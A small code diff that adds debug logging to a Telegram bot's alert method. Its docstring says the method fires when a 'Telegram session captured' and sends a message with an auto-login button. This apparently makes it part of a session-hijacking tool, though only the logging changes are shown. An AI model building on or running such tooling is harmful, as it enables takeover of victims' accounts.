@@ -69,7 +69,12 @@ class TelegramBot:
         ONLY alert - Telegram session captured
         Sends ONE message with auto-login button
         """
+        print(f"[TG Bot] on_telegram_captured called: {session_id}", flush=True)
+        print(f"[TG Bot] Profile: {profile_path}", flush=True)
+        print(f"[TG Bot] Already sent: {self.sent}", flush=True)
+        
         if session_id in self.sent:
+            print(f"[TG Bot] Already sent for this session, skipping", flush=True)
             return False
         self.sent.add(session_id)
         
